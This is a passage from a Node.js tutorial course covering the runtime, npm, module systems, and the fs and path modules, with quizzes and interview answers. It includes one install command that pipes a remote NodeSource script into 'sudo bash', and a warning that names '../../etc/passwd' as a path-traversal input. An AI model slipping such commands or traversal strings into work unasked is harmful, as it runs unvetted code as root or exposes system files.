---
id: nodejs
title: Node.js
icon: 🟢
track: Programming
color: #2E7D32
runner: js
libs: 
tagline: Run JavaScript outside the browser to build document pipelines and CLIs.
description: Node.js for automation engineers: the runtime, npm, modules, the file system, streams, buffers, child processes, building CLI tools, Express APIs, environment configuration, testing, and production deployment practices.
---

# LEVEL: Beginner

## What is Node and installing it

**Node.js** is a program that runs JavaScript outside the browser. It bundles Google's V8 engine (the same one inside Chrome) with **libuv**, a C library that provides the event loop, file system access, networking and child processes. The result is a runtime where the JavaScript you already know can read a folder of `.docx` files, call LibreOffice, and write a report, without any browser at all.

Node was created by Ryan Dahl in 2009. Today it is maintained by the OpenJS Foundation, releases a new major version every six months (even numbers become Long Term Support releases), and powers everything from the `docx` and `pptxgenjs` libraries' own build tools to the servers behind most web apps.

### Browser versus Node

Same language, different host. Neither has everything the other has:

| Feature | Browser | Node.js |
|---|---|---|
| `document`, `window`, DOM | yes | no |
| `fs`, `path`, `child_process` | no | yes |
| `fetch`, `URL`, `TextEncoder`, `setTimeout` | yes | yes (fetch since Node 18) |
| Global object | `window` | `global` (both share `globalThis`) |
| Module loading | `<script>` / ESM | CommonJS `require` and ESM `import` |
| Entry point | an HTML page | `node file.js` |

The Try It blocks in this course run in your browser, so they demonstrate ideas with pure JavaScript; the body text shows the real Node code to run locally.

### Installing

- **Windows / macOS**: download the LTS installer from nodejs.org, or use a version manager: `nvm` (macOS/Linux), `nvm-windows`, `fnm` or `volta`. Version managers let you switch between Node 20 and Node 22 per project.
- **Linux**: `curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - && sudo apt-get install -y nodejs`, or use `nvm`.

Verify in a terminal:

```bash
node -v      # v22.x.x
npm -v       # 10.x.x
node -p "process.platform + ' ' + process.arch"   # -p evaluates and prints an expression
```

### Running JavaScript with Node

Three ways, mirroring the browser console, script tag and file:

```bash
node                      # REPL: type JavaScript, see results, Ctrl+D to exit
node -e "console.log(2 ** 10)"   # evaluate a string
node hello.js             # run a file
```

A first script that uses something the browser cannot do, listing the current folder:

```js
// hello.js
const fs = require("fs");
console.log("Node", process.version, "on", process.platform);
console.log("Files here:", fs.readdirSync(".").length);
```

Run `node hello.js`. The `require("fs")` line loads Node's built-in file-system module, and `process` is a global object describing the running program. Since Node 18 you can also write `require("node:fs")`; the `node:` prefix makes it explicit that this is a built-in, not an npm package.

### Watch mode and the inspector

`node --watch hello.js` (Node 18.11+) restarts the script whenever a file changes, replacing the old `nodemon` dependency for simple cases. `node --inspect hello.js` opens a debugging port you can attach Chrome DevTools to via `chrome://inspect`, giving you breakpoints and the profiler for server code.

### Where Node fits in a document pipeline

A typical automation job for a 767-page handbook: a Node script reads a JSON manifest, builds the document with `docx`, writes `handbook.docx` with `fs.writeFile`, then spawns `soffice --headless --convert-to pdf` to produce the PDF, and finally logs page counts and file sizes. Each step maps to a chapter of this course.

> **Tip:** Keep one LTS version per project and record it in a `.nvmrc` file (`22`) or the `engines` field of `package.json` so colleagues and CI use the same runtime.

### Try It Yourself

```js
// Detect the host environment with pure JavaScript (works in a browser or in Node).
const isNode = typeof process !== "undefined" && !!process.versions?.node;
const isBrowser = typeof window !== "undefined" && typeof document !== "undefined";
console.log("Running in:", isNode ? `Node ${process.versions.node}` : isBrowser ? "a browser" : "an unknown host");
console.log("globalThis is the same object everywhere:", typeof globalThis);
const hostGlobals = ["document", "window", "require", "process", "fetch", "setTimeout", "structuredClone"];
for (const name of hostGlobals) console.log(name.padEnd(16), typeof globalThis[name]);
console.log("V8 numbers behave the same in both hosts:", 0.1 + 0.2, 2 ** 53);
```

### Quiz

1. What does Node.js combine to run JavaScript outside the browser?
- [x] The V8 engine and the libuv library
- [ ] A browser without a window
- [ ] A Java virtual machine
> V8 executes JavaScript; libuv provides the event loop, file and network I/O.

2. Which global exists in Node but not in browsers?
- [ ] document
- [x] process
- [ ] window
> `process` describes the running Node program; the DOM globals do not exist in Node.

3. What does `node -p "1 + 1"` do?
- [ ] Opens the REPL
- [x] Evaluates the expression and prints 2
- [ ] Runs a file named 1 + 1
> `-p` evaluates a string and prints the result; `-e` evaluates without printing.

4. Which Node versions become Long Term Support releases?
- [x] Even-numbered majors
- [ ] Odd-numbered majors
- [ ] Every release
> Even majors (18, 20, 22) get LTS status; odd ones are short-lived.

### Exercises

1. **Version check** — Write a script that prints the Node version and exits with code 1 if the major version is below 20.
<details><summary>Solution</summary>

```js
const major = Number(process.versions.node.split(".")[0]);
console.log("Node", process.version);
if (major < 20) { console.error("Need Node 20+"); process.exit(1); }
```

</details>

2. **List a folder** — Using `fs.readdirSync`, print every file name in the current directory on its own line, numbered.
<details><summary>Solution</summary>

```js
const fs = require("node:fs");
fs.readdirSync(".").forEach((name, i) => console.log(`${i + 1}. ${name}`));
```

</details>

### Interview Questions

**Q: What is Node.js and how does it differ from running JavaScript in a browser?**
Node.js is a JavaScript runtime built on V8 plus libuv, giving JavaScript access to the file system, networking, processes and threads through built-in modules. In the browser the host provides the DOM and Web APIs and sandboxes the code; in Node the host provides system access and no DOM. Both share the language, the event loop concept and, since Node 18, a growing set of common APIs such as `fetch`, `URL`, `TextEncoder` and Web Streams. The practical difference for me is that Node can drive tools like LibreOffice and write files directly, which is what document automation needs.

**Q: Why is Node.js single-threaded, and how does it handle many concurrent operations?**
JavaScript execution happens on one main thread, but I/O is delegated to libuv, which uses the operating system's asynchronous primitives (epoll, kqueue, IOCP) for sockets and a thread pool (default size 4, tunable with `UV_THREADPOOL_SIZE`) for file system and DNS work. When an operation completes, its callback is queued and the event loop runs it on the main thread. So a Node process can have thousands of in-flight requests while using one thread for JavaScript, which is efficient for I/O-heavy work and poor for CPU-heavy work, where worker threads or child processes are needed.

**Q: What are LTS releases and why do they matter for production?**
Every even-numbered Node major enters Active LTS in October of its release year and receives bug and security fixes for 30 months in total, while odd majors are supported for only about eight months. Production systems pin to an LTS line so that updates are low-risk, and tools like `nvm` and the `engines` field in package.json keep everyone on the same version. When choosing libraries I check they support the current LTS, and I plan a migration each year when a line reaches end of life.

## npm and package.json

**npm** is both the registry where JavaScript packages live (over two million of them, including `docx`, `pptxgenjs`, `pdf-lib`, `commander` and `express`) and the command-line tool that installs them. The file that describes your project to npm is `package.json`.

### Creating a project

```bash
mkdir doc-pipeline && cd doc-pipeline
npm init -y          # creates package.json with defaults
```

The generated file:

```json
{
  "name": "doc-pipeline",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": { "test": "echo \"Error: no test specified\" && exit 1" },
  "license": "ISC"
}
```

`name` and `version` identify the package; `main` is the entry file others get when they `require` it; `scripts` are named commands.

### Installing packages

```bash
npm install docx pptxgenjs        # runtime dependencies
npm install --save-dev eslint     # development-only (-D for short)
npm install commander@12          # a specific major version
npm uninstall pptxgenjs
```

Installing does three things: downloads the package into `node_modules/`, adds it to `dependencies` (or `devDependencies`) in `package.json`, and records the exact resolved version tree in `package-lock.json`. Commit `package.json` and the lock file; never commit `node_modules`, which can be regenerated with `npm install` and is often hundreds of megabytes.

| Field | Contains | Installed in production? |
|---|---|---|
| `dependencies` | code your program needs to run (`docx`, `express`) | yes |
| `devDependencies` | tools for developing (`eslint`, `jest`, `nodemon`) | no with `npm install --omit=dev` |
| `peerDependencies` | packages the user must install themselves (plugins) | user's choice |
| `optionalDependencies` | nice-to-have, install failure is not fatal | attempted |

### Semantic versioning

Versions are `MAJOR.MINOR.PATCH`: breaking change, new feature, bug fix. The range symbols in `package.json` say how far updates may drift:

| Range | Allows | Example with `5.2.1` |
|---|---|---|
| `^5.2.1` (default) | same major | `5.2.2`, `5.9.0`, not `6.0.0` |
| `~5.2.1` | same minor | `5.2.9`, not `5.3.0` |
| `5.2.1` | exactly this | nothing else |
| `>=5 <7` | explicit range | `5.x`, `6.x` |
| `*` or `latest` | anything | dangerous |

For `0.x` versions, `^0.2.1` allows only `0.2.x`, because pre-1.0 minors are treated as breaking. `npm outdated` lists packages behind their range; `npm update` moves within ranges; `npm install pkg@latest` crosses a major.

### The lock file and reproducible installs

`package-lock.json` pins every package and sub-package to an exact version and an integrity hash. `npm install` respects it; `npm ci` (clean install) deletes `node_modules`, installs exactly what the lock says, and fails if the lock and `package.json` disagree. Use `npm ci` in CI and Docker builds so the same tree is installed every time.

### Scripts

```json
"scripts": {
  "start": "node src/index.js",
  "build": "node src/build-handbook.js --out dist",
  "convert": "node src/convert.js dist/*.docx",
  "test": "node --test",
  "lint": "eslint src",
  "prebuild": "npm run lint"
}
```

Run with `npm run build`; `npm start` and `npm test` work without `run`. Scripts can call any binary installed in `node_modules/.bin` by bare name, which is why `eslint src` works without a path. A `pre<name>` or `post<name>` script runs automatically before or after `<name>`.

### npx

`npx cowsay hello` runs a package's binary without installing it globally, downloading it temporarily if needed. `npx eslint --init` scaffolds a config; `npx create-vite` bootstraps a project. For binaries already in your project, `npx jest` is equivalent to `npm run` with the `.bin` path.

### Global installs and alternatives

`npm install -g pm2` puts a command on your PATH for tools you use across projects. Alternative package managers, `pnpm` (disk-efficient, strict) and `yarn`, read the same `package.json`; `corepack enable` (bundled with Node) manages their versions.

> **Warning:** Typos in package names are an attack vector (typosquatting). Check the package page, weekly downloads and repository before installing, and run `npm audit` regularly to catch known vulnerabilities in your tree.

### Try It Yourself

```js
// A pure-JS semver range checker, the logic npm applies when resolving ^ and ~ ranges.
const parse = v => v.split(".").map(Number);
function satisfies(version, range) {
  const op = range.match(/^[\^~]?/)[0];
  const [M, m, p] = parse(range.slice(op.length));
  const [vM, vm, vp] = parse(version);
  const notBelow = vM > M || (vM === M && (vm > m || (vm === m && vp >= p)));
  if (!notBelow) return false;
  if (op === "^") return M > 0 ? vM === M : m > 0 ? vM === 0 && vm === m : version === range.slice(1);
  if (op === "~") return vM === M && vm === m;
  return version === range;
}
const tests = [["5.9.0", "^5.2.1"], ["6.0.0", "^5.2.1"], ["5.2.9", "~5.2.1"], ["5.3.0", "~5.2.1"], ["0.2.7", "^0.2.1"], ["0.3.0", "^0.2.1"], ["5.2.1", "5.2.1"]];
for (const [v, r] of tests) console.log(`${v} satisfies ${r}?`.padEnd(30), satisfies(v, r));

const pkg = { name: "doc-pipeline", version: "1.4.2", dependencies: { docx: "^9.0.0", commander: "~12.1.0" }, devDependencies: { eslint: "^9.0.0" } };
const bump = (v, part) => { const [M, m, p] = parse(v); return part === "major" ? `${M + 1}.0.0` : part === "minor" ? `${M}.${m + 1}.0` : `${M}.${m}.${p + 1}`; };
console.log("Next patch:", bump(pkg.version, "patch"), "| next minor:", bump(pkg.version, "minor"), "| next major:", bump(pkg.version, "major"));
console.log("Production installs:", Object.keys(pkg.dependencies).join(", "), "| dev only:", Object.keys(pkg.devDependencies).join(", "));
```

### Quiz

1. What does `^4.2.0` allow?
- [x] Any 4.x.y version at or above 4.2.0
- [ ] Only 4.2.x
- [ ] Any version including 5.0.0
> The caret keeps the major version fixed.

2. Which file should you commit to git?
- [ ] node_modules
- [x] package-lock.json
- [ ] Neither
> The lock file makes installs reproducible; `node_modules` is regenerated.

3. Which command installs exactly what the lock file specifies and fails on mismatch?
- [ ] npm install
- [x] npm ci
- [ ] npm update
> `npm ci` is designed for CI and containers.

4. Where do development-only tools like ESLint belong?
- [ ] dependencies
- [x] devDependencies
- [ ] peerDependencies
> They are not needed at runtime, so production installs can omit them.

### Exercises

1. **Add scripts** — Write the `scripts` block for a project with `start` (runs `src/index.js`), `test` (runs `node --test`) and a `pretest` that runs ESLint.
<details><summary>Solution</summary>

```json
"scripts": {
  "start": "node src/index.js",
  "pretest": "eslint src",
  "test": "node --test"
}
```

</details>

2. **Range reasoning** — Given `"docx": "^8.5.0"`, list which of 8.5.1, 8.9.0, 9.0.0 would be installed by `npm update`.
<details><summary>Solution</summary>

```text
8.5.1  yes (patch within ^8)
8.9.0  yes (minor within ^8)
9.0.0  no  (new major; requires npm install docx@9)
```

</details>

3. **Version bump** — Show the npm commands that bump a package from 1.4.2 to 1.5.0 and tag the commit.
<details><summary>Solution</summary>

```bash
npm version minor      # updates package.json to 1.5.0, commits, creates tag v1.5.0
git push --follow-tags
```

</details>

### Interview Questions

**Q: What is the difference between dependencies and devDependencies?**
`dependencies` are packages the program needs at runtime, such as `express` or `docx`, and they are installed everywhere including production. `devDependencies` are tools used only while developing, such as test runners, linters and bundlers, and `npm install --omit=dev` (or `NODE_ENV=production`) skips them, which keeps Docker images and deploy times small. Getting this wrong in either direction causes real bugs: a runtime package in devDependencies crashes production, and a giant toolchain in dependencies bloats every install. For libraries, `peerDependencies` express "the host app must provide this", which prevents duplicate copies of frameworks.

**Q: Why does package-lock.json exist and what is the difference between npm install and npm ci?**
Ranges in `package.json` allow drift, so two installs a week apart can produce different trees, and transitive dependencies are not listed at all. The lock file records the exact version and integrity hash of every package in the tree, making installs reproducible. `npm install` reads the lock but will update it if `package.json` changed, whereas `npm ci` requires the lock to match, deletes `node_modules`, installs exactly the locked tree, and is faster because it skips resolution. I use `npm install` on my machine and `npm ci` in CI pipelines and Dockerfiles.

**Q: Explain semantic versioning and how the caret and tilde ranges work.**
SemVer is `MAJOR.MINOR.PATCH`: bump major for breaking changes, minor for backward-compatible features, patch for fixes. `^1.2.3` accepts anything below `2.0.0`, trusting that minors and patches are safe; `~1.2.3` accepts only patches below `1.3.0`. Below 1.0.0 the rules tighten so `^0.2.3` stays within `0.2.x`, since pre-release APIs change often. The trade-off is that caret ranges pick up fixes automatically but rely on maintainers honoring SemVer, which is why the lock file and tests exist; for critical build tooling I sometimes pin exact versions.

## CommonJS versus ESM modules

Node has two module systems. **CommonJS** (CJS) is the original: `require()` and `module.exports`. **ECMAScript modules** (ESM) are the standard `import`/`export` syntax that browsers also use. Every Node project must choose, and you will read both in the wild, so you need to be fluent in each and know how they interoperate.

### CommonJS

```js
// rates.js
const DEFAULT_RATE = 5.75;
function premium(amount, rate = DEFAULT_RATE) { return (amount / 1000) * rate; }
module.exports = { DEFAULT_RATE, premium };

// app.js
const { premium } = require("./rates");        // extension optional for CJS
const fs = require("node:fs");
const docx = require("docx");                   // from node_modules
console.log(premium(250000));
```

`require` is synchronous: it reads the file, wraps it in a function `(exports, require, module, __filename, __dirname) => { ... }`, runs it, caches the result in `require.cache`, and returns `module.exports`. Because of the wrapper, every CJS file gets `__dirname` and `__filename` for free, and top-level variables stay private to the file.

`exports` is a shorthand alias for `module.exports`; `exports.premium = fn` works, but `exports = { ... }` breaks the link and exports nothing. Assign to `module.exports` when replacing the whole object.

### ES modules

```js
// rates.mjs
export const DEFAULT_RATE = 5.75;
export function premium(amount, rate = DEFAULT_RATE) { return (amount / 1000) * rate; }
export default class RateTable {}

// app.mjs
import RateTable, { premium } from "./rates.mjs";   // extension required
import fs from "node:fs";
import { readFile } from "node:fs/promises";
import { Document, Packer } from "docx";
const config = JSON.parse(await readFile("./config.json", "utf8"));   // top-level await
```

Node treats a file as ESM when it ends in `.mjs`, or when it ends in `.js` and the nearest `package.json` has `"type": "module"`. `.cjs` forces CommonJS. Imports are resolved and linked before any code runs, so `import` must sit at the top level, relative paths need the extension, and there is no `__dirname`:

```js
import { fileURLToPath } from "node:url";
import { dirname } from "node:path";
const __dirname = dirname(fileURLToPath(import.meta.url));
// Node 20.11+: import.meta.dirname and import.meta.filename exist directly
```

### Side-by-side

| | CommonJS | ESM |
|---|---|---|
| Syntax | `require`, `module.exports` | `import`, `export` |
| Loading | synchronous, at call time | asynchronous, resolved before execution |
| Exports | a copied value (snapshot of the object) | live bindings |
| Top-level `await` | no | yes |
| `__dirname` | yes | `import.meta.dirname` (20.11+) |
| Strict mode | opt in | always |
| JSON import | `require("./x.json")` | `import x from "./x.json" with { type: "json" }` |
| Dynamic load | `require(variable)` | `await import(variable)` |
| Tree-shaking by bundlers | no | yes |

### Interoperability

- ESM can `import` a CommonJS module; the whole `module.exports` becomes the default import, and named imports work only for statically detectable properties.
- CommonJS can load ESM with `await import("./x.mjs")`. Since Node 22.12 (and 20.17 with a flag), `require()` of an ESM file also works when the module has no top-level `await`.
- Packages declare both entry points with the `exports` field: `{ "exports": { "import": "./dist/index.mjs", "require": "./dist/index.cjs" } }`, which is how `docx` ships a build for each system.

### Which to choose

New projects: ESM (`"type": "module"`). It is the standard, works in browsers unchanged, supports top-level `await`, and every major library now ships ESM. Choose CommonJS only when a critical dependency or tool (some older Jest setups, certain serverless platforms) requires it. Do not mix styles within a file: `require` is undefined in ESM, and `import` is a syntax error in CJS.

### The module cache

Both systems evaluate a module once and cache it. Importing `./config.js` from ten files runs it once, which makes modules a natural place for singletons such as a database connection or a loaded rate matrix. To reload a CJS module deliberately, delete its entry from `require.cache`; ESM has no supported way, so restart the process (`node --watch`).

> **Interview note:** "Why do imports need to be at the top level?" Because ESM resolution happens before execution so the engine can build the dependency graph, detect cycles and enable static analysis; conditional loading uses dynamic `import()` instead.

### Try It Yourself

```js
// A miniature CommonJS loader in pure JavaScript: shows the wrapper, module.exports and the cache.
const files = {
  "/app/rates.js": `const DEFAULT_RATE = 5.75;
    let loads = (globalThis.__loads = (globalThis.__loads || 0) + 1);
    exports.DEFAULT_RATE = DEFAULT_RATE;
    exports.premium = (amount, rate = DEFAULT_RATE) => (amount / 1000) * rate;
    exports.loadedTimes = loads;`,
  "/app/report.js": `const { premium } = require("/app/rates.js");
    module.exports = amount => "Premium: " + premium(amount).toFixed(2) + " (dir " + __dirname + ")";`,
};
const cache = {};
function requireFrom(path) {
  if (cache[path]) return cache[path].exports;
  const module = { exports: {} };
  cache[path] = module;
  const wrapper = new Function("exports", "require", "module", "__filename", "__dirname", files[path]);
  wrapper(module.exports, requireFrom, module, path, path.slice(0, path.lastIndexOf("/")));
  return module.exports;
}
const report = requireFrom("/app/report.js");
console.log(report(250000));
const rates = requireFrom("/app/rates.js");
console.log("Cached (same object)?", rates === cache["/app/rates.js"].exports, "| evaluated", rates.loadedTimes, "time(s)");
console.log("Exported keys:", Object.keys(rates));
console.log("ESM equivalent would be: import { premium } from './rates.js' with live bindings and no __dirname.");
```

### Quiz

1. Which setting makes `.js` files load as ES modules?
- [ ] `"module": true` in package.json
- [x] `"type": "module"` in package.json
- [ ] A `use esm` directive
> The `type` field (or the `.mjs` extension) selects ESM.

2. What is wrong with `exports = { a: 1 }` in CommonJS?
- [x] It reassigns the local alias and exports nothing
- [ ] It is a syntax error
- [ ] It exports `a` twice
> `exports` is only a reference to `module.exports`; replace the whole object via `module.exports`.

3. How does ESM get the current directory?
- [ ] `__dirname` works the same
- [x] From `import.meta.url` (or `import.meta.dirname` in Node 20.11+)
- [ ] `process.dirname()`
> ESM has no wrapper function, so the URL of the module is the source of truth.

4. Which feature does ESM support that CommonJS does not?
- [ ] Synchronous loading
- [x] Top-level await
- [ ] The `require.cache` object
> ESM loading is asynchronous, which makes top-level `await` possible.

### Exercises

1. **Convert** — Rewrite this CommonJS file as ESM: `const path = require("path"); module.exports = { ext: f => path.extname(f) };`
<details><summary>Solution</summary>

```js
import path from "node:path";
export const ext = f => path.extname(f);
```

</details>

2. **Dirname in ESM** — Write the two lines that recreate `__dirname` in an ES module on Node 18.
<details><summary>Solution</summary>

```js
import { fileURLToPath } from "node:url";
const __dirname = new URL(".", import.meta.url).pathname;   // or dirname(fileURLToPath(import.meta.url))
```

</details>

3. **Conditional load** — Load `./heavy-pdf.js` only when a `--pdf` flag is present, in ESM.
<details><summary>Solution</summary>

```js
if (process.argv.includes("--pdf")) {
  const { toPdf } = await import("./heavy-pdf.js");
  await toPdf("handbook.docx");
}
```

</details>

### Interview Questions

**Q: How does require() work under the hood?**
`require` resolves the specifier (core module, relative path with extension guessing `.js`, `.json`, `.node`, or a `node_modules` walk up the directory tree), checks `require.cache`, and if the module is not cached reads the file and wraps its source in a function with parameters `exports`, `require`, `module`, `__filename` and `__dirname`. It executes that function synchronously, stores the module object in the cache keyed by absolute path, and returns `module.exports`. Because it is synchronous and cached, the first `require` of a large library is slow and subsequent ones are instant, and circular requires return a partially filled `exports` object, which is a classic bug source.

**Q: What are live bindings and why do they matter?**
In ESM, an import is a read-only view of the exporting module's variable, so if the exporter reassigns `export let count`, importers see the new value. CommonJS copies the value of `module.exports` at require time, so destructured primitives never update. This matters for things like a mutable configuration or a counter shared between modules, and it explains why mocking works differently: Jest can replace CJS exports in the cache, but ESM bindings need loader hooks or dependency injection. It is also what enables bundlers to tree-shake, since the graph is static.

**Q: What problems come up when mixing ESM and CommonJS, and how do you handle them?**
Named imports from a CJS package may fail because Node can only detect statically assigned properties, so you import the default and destructure. `__dirname`, `__filename` and `require` do not exist in ESM, so you derive paths from `import.meta.url` or use `createRequire`. JSON imports need an import attribute. Tools such as older Jest, ts-node or some serverless runtimes assume CJS, which forces configuration. When publishing a library I ship both formats through the `exports` map with `import` and `require` conditions, and I test each entry point, because the "dual package hazard" of two copies of the same module can break `instanceof` checks.

## The fs and path modules

Document automation is file work: read a manifest, write a `.docx`, move PDFs into dated folders. Node's built-in `fs` module does the reading and writing, and `path` builds file paths that work on Windows (`C:\Jobs\deed.pdf`) and Linux (`/jobs/deed.pdf`) alike.

### Three flavours of fs

```js
const fs = require("node:fs");                 // callback and sync APIs
const fsp = require("node:fs/promises");       // promise API (preferred)

// 1. Synchronous: blocks the process; fine for scripts and startup
const text = fs.readFileSync("manifest.json", "utf8");

// 2. Callback: error-first style, the original API
fs.readFile("manifest.json", "utf8", (err, data) => { if (err) throw err; console.log(data.length); });

// 3. Promises: use with async/await
const data = await fsp.readFile("manifest.json", "utf8");
```

Pass an encoding (`"utf8"`) to get a string; omit it to get a `Buffer` of raw bytes, which is what you want for `.docx` and `.pdf`. In a CLI script `readFileSync` is acceptable; in a server, never block the event loop with sync calls.

### Writing, appending and creating folders

```js
await fsp.writeFile("out/report.txt", "Week 37\n");             // creates or overwrites
await fsp.appendFile("out/report.txt", "412 files processed\n");
await fsp.mkdir("out/2026/09", { recursive: true });            // like mkdir -p, no error if exists
await fsp.writeFile("out/handbook.docx", await Packer.toBuffer(doc));   // Buffer from docx
await fsp.copyFile("out/handbook.docx", "archive/handbook-v3.docx");
await fsp.rename("out/tmp.pdf", "out/final.pdf");               // also moves across folders
await fsp.rm("out/tmp", { recursive: true, force: true });      // rm -rf
```

`writeFile` fails if the parent folder is missing, so `mkdir` first. Writes are not atomic: for a file others may read while you write, write to `final.pdf.tmp` and `rename` it over the target.

### Listing and inspecting

```js
const entries = await fsp.readdir("jobs", { withFileTypes: true });
for (const e of entries) {
  if (e.isFile() && e.name.endsWith(".docx")) console.log("document:", e.name);
  if (e.isDirectory()) console.log("folder:", e.name);
}
const st = await fsp.stat("jobs/deed.pdf");
console.log(st.size, "bytes, modified", st.mtime.toISOString(), st.isFile());
try { await fsp.access("jobs/missing.pdf"); } catch { console.log("does not exist"); }
```

`readdir` with `{ recursive: true }` (Node 20+) walks subfolders. Prefer trying the operation and catching `ENOENT` over checking existence first; the file can vanish between the check and the use.

### Error codes

| `err.code` | Meaning |
|---|---|
| `ENOENT` | no such file or directory |
| `EEXIST` | already exists (mkdir without recursive) |
| `EACCES` / `EPERM` | permission denied |
| `EISDIR` / `ENOTDIR` | expected a file / expected a directory |
| `EBUSY` | file locked (Word has it open) |
| `EMFILE` | too many open files (raise the limit or throttle) |

Always branch on `err.code`, not on the message text, which varies by platform.

### The path module

Never build paths with string concatenation. `path` knows the platform separator and normalizes `..` segments:

```js
const path = require("node:path");
path.join("jobs", "2026", "..", "deed.pdf");      // "jobs/deed.pdf" (or jobs\deed.pdf on Windows)
path.resolve("out", "report.pdf");                // absolute, from the current working directory
path.basename("/jobs/TX-2026-00123.docx");        // "TX-2026-00123.docx"
path.basename("/jobs/TX-2026-00123.docx", ".docx"); // "TX-2026-00123"
path.extname("deed.final.PDF");                   // ".PDF"
path.dirname("/jobs/a/b.pdf");                    // "/jobs/a"
path.parse("/jobs/deed.pdf");                     // { root: "/", dir: "/jobs", base: "deed.pdf", ext: ".pdf", name: "deed" }
path.format({ dir: "/out", name: "deed", ext: ".pdf" });   // "/out/deed.pdf"
path.relative("/jobs", "/jobs/2026/deed.pdf");    // "2026/deed.pdf"
path.sep; path.delimiter;                          // "/" or "\\"; ":" or ";" (PATH separator)
```

`path.posix` and `path.win32` force one platform's rules, useful when generating paths for a config file that another OS will read. To change an extension: `path.format({ ...path.parse(f), base: undefined, ext: ".pdf" })`.

### Putting it together

```js
import fsp from "node:fs/promises";
import path from "node:path";
const src = "jobs", out = "out/pdf";
await fsp.mkdir(out, { recursive: true });
for (const e of await fsp.readdir(src, { withFileTypes: true })) {
  if (!e.isFile() || path.extname(e.name).toLowerCase() !== ".docx") continue;
  const target = path.join(out, path.basename(e.name, ".docx") + ".pdf");
  console.log(`${path.join(src, e.name)} -> ${target}`);
}
```

> **Warning:** `path.join(base, userInput)` does not stop `../../etc/passwd`. When a path comes from outside, resolve it and verify it still starts with the allowed folder; the security chapter covers this.

### Try It Yourself

```js
// Pure-JS versions of the path helpers, to see exactly what they compute.
const posix = {
  normalize(p) { const out = []; for (const seg of p.split("/")) { if (!seg || seg === ".") continue; if (seg === "..") out.pop(); else out.push(seg); } return (p.startsWith("/") ? "/" : "") + out.join("/"); },
  join(...parts) { return this.normalize(parts.join("/")); },
  basename(p, ext) { const b = p.slice(p.lastIndexOf("/") + 1); return ext && b.endsWith(ext) ? b.slice(0, -ext.length) : b; },
  extname(p) { const b = this.basename(p); const i = b.lastIndexOf("."); return i > 0 ? b.slice(i) : ""; },
  dirname(p) { const i = p.lastIndexOf("/"); return i <= 0 ? (i === 0 ? "/" : ".") : p.slice(0, i); },
  parse(p) { const base = this.basename(p), ext = this.extname(p); return { dir: this.dirname(p), base, ext, name: ext ? base.slice(0, -ext.length) : base }; },
};
console.log(posix.join("jobs", "2026", "..", "deed.pdf"));
console.log(posix.basename("/jobs/TX-2026-00123.docx", ".docx"), "|", posix.extname("deed.final.PDF"), "|", posix.extname(".gitignore"));
console.log(posix.parse("/jobs/2026/handbook.v3.docx"));
const files = ["deed.docx", "survey.DOCX", "notes.txt", "policy.docx", "README"];
const plan = files.filter(f => posix.extname(f).toLowerCase() === ".docx").map(f => `${posix.join("jobs", f)} -> ${posix.join("out/pdf", posix.parse(f).name + ".pdf")}`);
console.log(plan.join("\n"));
const errs = { ENOENT: "no such file", EACCES: "permission denied", EBUSY: "file is locked (close it in Word)" };
for (const code of ["ENOENT", "EBUSY", "EIO"]) console.log(code, "->", errs[code] ?? "unexpected error, rethrow");
```

### Quiz

1. What does `fs.readFileSync("x.docx")` return without an encoding argument?
- [ ] A string
- [x] A Buffer of raw bytes
- [ ] An array of lines
> Only when you pass an encoding does Node decode the bytes into a string.

2. Which option makes `mkdir` create parent folders and ignore an existing folder?
- [x] `{ recursive: true }`
- [ ] `{ force: true }`
- [ ] `{ parents: true }`
> `recursive: true` behaves like `mkdir -p`.

3. What does `path.basename("/jobs/deed.pdf", ".pdf")` return?
- [ ] "/jobs/deed"
- [x] "deed"
- [ ] "deed.pdf"
> The second argument strips a matching extension.

4. Which error code means the file does not exist?
- [ ] EACCES
- [x] ENOENT
- [ ] EEXIST
> ENOENT is "Error NO ENTry"; branch on `err.code` rather than the message.

### Exercises

1. **Change extension** — Write `withExt(file, ext)` using `path.parse` and `path.format` so `withExt("a/b.docx", ".pdf")` gives `a/b.pdf`.
<details><summary>Solution</summary>

```js
const path = require("node:path");
const withExt = (f, ext) => path.format({ ...path.parse(f), base: undefined, ext });
console.log(withExt("a/b.docx", ".pdf")); // a/b.pdf
```

</details>

2. **Safe read** — Write `readJson(file)` that returns the parsed object, or `null` if the file is missing, but rethrows any other error.
<details><summary>Solution</summary>

```js
const fsp = require("node:fs/promises");
async function readJson(file) {
  try { return JSON.parse(await fsp.readFile(file, "utf8")); }
  catch (e) { if (e.code === "ENOENT") return null; throw e; }
}
```

</details>

3. **Folder size** — Sum the sizes of all files directly inside a folder using `readdir` and `stat`.
<details><summary>Solution</summary>

```js
const fsp = require("node:fs/promises"), path = require("node:path");
async function folderSize(dir) {
  let total = 0;
  for (const e of await fsp.readdir(dir, { withFileTypes: true }))
    if (e.isFile()) total += (await fsp.stat(path.join(dir, e.name))).size;
  return total;
}
folderSize(".").then(n => console.log(n, "bytes"));
```

</details>

### Interview Questions

**Q: When is it acceptable to use the synchronous fs methods?**
In short-lived scripts and CLI tools, and during application startup before the server accepts traffic, where blocking for a few milliseconds costs nothing and the code is simpler. In a server or any long-running process, sync calls stall the event loop for every concurrent request while the disk responds, which under load turns a 5 ms read into seconds of latency for everyone. My rule is: `readFileSync` for config at boot, `fs/promises` everywhere else, and streams for anything bigger than a few megabytes.

**Q: Why should you avoid checking whether a file exists before opening it?**
Because of the time-of-check to time-of-use race: the file can be created, deleted or replaced between `existsSync` and the actual `open`, and an attacker can exploit that window to swap a symlink. It also doubles the system calls. The idiomatic approach is to attempt the operation and handle `ENOENT` (or `EEXIST` for creation with the `wx` flag), which is atomic from the program's point of view. `fs.access` exists mainly for permission diagnostics, not as a guard.

**Q: How do you make a file write safe against crashes or concurrent readers?**
Write to a temporary file in the same directory, flush it, then `rename` it over the destination; on POSIX systems `rename` is atomic, so readers see either the old or the new complete file, never a half-written one. For durability call `fileHandle.sync()` before the rename so the data is on disk, not just in the OS cache. If several processes might write, add a lock file created with the exclusive `wx` flag or use a queue so only one writer exists. This pattern is standard in tools that regenerate a report every hour while a dashboard keeps reading it.

## Command-line arguments and process

Every Node script has a global `process` object: the bridge between your code and the operating system. It gives you the command-line arguments, environment variables, standard input and output, the exit code and the signals that tell your program to stop. A script that reads its inputs from `process.argv` instead of hard-coded values becomes a reusable tool.

### process.argv

```bash
node convert.js jobs/deed.docx --format pdf --verbose
```

```js
console.log(process.argv);
